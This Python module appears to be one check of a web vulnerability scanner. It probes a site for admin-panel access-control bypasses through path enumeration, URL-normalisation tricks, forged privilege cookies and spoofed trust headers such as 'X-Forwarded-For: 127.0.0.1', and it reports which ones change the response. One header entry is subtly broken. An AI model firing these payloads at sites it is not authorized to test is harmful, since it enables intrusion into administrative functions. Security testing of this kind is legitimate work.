from typing import Dict, List, Optional
import requests

ADMIN_PATHS = [
    "/admin", "/administrator", "/admin.php", "/admin/login",
    "/wp-admin", "/phpmyadmin", "/manager", "/management",
    "/panel", "/cpanel", "/console", "/dashboard",
    "/backend", "/api/admin", "/admin/api", "/admin/panel",
    "/admin/dashboard", "/admin/console", "/admin/management",
    "/admin/index.php", "/admin/index.html", "/admin/login.php",
]

PATH_BYPASSES = [
    "/admin", "/admin/", "//admin//", "/./admin",
    "/admin/.", "/admin%00", "/admin%20", "/ADMIN",
    "/Admin", "/admin;foo", "/admin..;/", "/*/admin",
    "/admin/../admin", "/admin/.%00",
]

COOKIE_TAMPER_PAYLOADS = [
    {"admin": "1"}, {"admin": "true"}, {"admin": "True"},
    {"role": "admin"}, {"role": "administrator"}, {"role": "1"},
    {"is_admin": "1"}, {"is_admin": "true"}, {"user_type": "admin"},
    {"group": "admin"}, {"level": "admin"}, {"access": "admin"},
    {"superuser": "1"}, {"super_admin": "1"},
    {"admin_level": "1"}, {"administrator": "1"},
    {"user": "admin"}, {"username": "admin"},
    {"member": "admin"}, {"member_type": "admin"},
]

HEADER_INJECTIONS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/" or "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Port": "443"},
    {"X-Internal": "true"},
    {"X-Auth-Type": "admin"},
    {"X-Remote-User": "admin"},
    {"X-Remote-Group": "admin"},
    {"X-Auth-User": "admin"},
]


def check_admin_endpoints(url: str, sess: Optional[requests.Session] = None,
                          timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session()
    results = []
    base = url.rstrip("/")
    for path in ADMIN_PATHS:
        try:
            r = sess.get("%s%s" % (base, path), timeout=timeout, verify=False)
            if r.status_code in (200, 301, 302, 403):
                results.append({"path": path, "status": r.status_code,
                                "length": len(r.text)})
        except:
            pass
    return results


def check_path_bypass(url_pattern: str, sess: Optional[requests.Session] = None,
                      timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session()
    results = []
    for bp in PATH_BYPASSES:
        test_url = url_pattern.replace("/admin", bp) if "/admin" in url_pattern else bp
        try:
            r = sess.get(test_url if test_url.startswith("http") else url_pattern.rstrip("/") + bp,
                         timeout=timeout, verify=False)
            if r.status_code == 200:
                results.append({"bypass": bp, "status": r.status_code, "url": r.url})
        except:
            pass
    return results


def check_cookie_tamper(url: str, sess: Optional[requests.Session] = None,
                        timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session()
    baseline = None
    try:
        baseline = sess.get(url, timeout=timeout, verify=False)
    except:
        return []
    results = []
    for payload in COOKIE_TAMPER_PAYLOADS:
        try:
            c = requests.Session()
            c.headers.update(sess.headers)
            for k, v in payload.items():
                c.cookies.set(k, v)
            r = c.get(url, timeout=timeout, verify=False)
            if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
                results.append({"cookie": payload, "status": r.status_code,
                                "length": len(r.text)})
        except:
            pass
    return results


def check_header_injection(url: str, sess: Optional[requests.Session] = None,
                           timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session()
    baseline = None
    try:
        baseline = sess.get(url, timeout=timeout, verify=False)
    except:
        return []
    results = []
    for headers in HEADER_INJECTIONS:
        try:
            r = sess.get(url, headers=headers, timeout=timeout, verify=False)
            if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
                results.append({"headers": headers, "status": r.status_code,
                                "length": len(r.text)})
        except:
            pass
    return results


def check(url: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    r = {
        "vulnerable": False,
        "admin_endpoints": [],
        "path_bypasses": [],
        "cookie_bypasses": [],
        "header_bypasses": [],
    }
    if not url.startswith("http"):
        url = "http://" + url
    r["admin_endpoints"] = check_admin_endpoints(url, sess, timeout)
    r["path_bypasses"] = check_path_bypass(url, sess, timeout)
    r["cookie_bypasses"] = check_cookie_tamper(url, sess, timeout)
    r["header_bypasses"] = check_header_injection(url, sess, timeout)
    total = len(r["path_bypasses"]) + len(r["cookie_bypasses"]) + len(r["header_bypasses"])
    r["vulnerable"] = total > 0
    r["total_bypasses"] = total
    return r
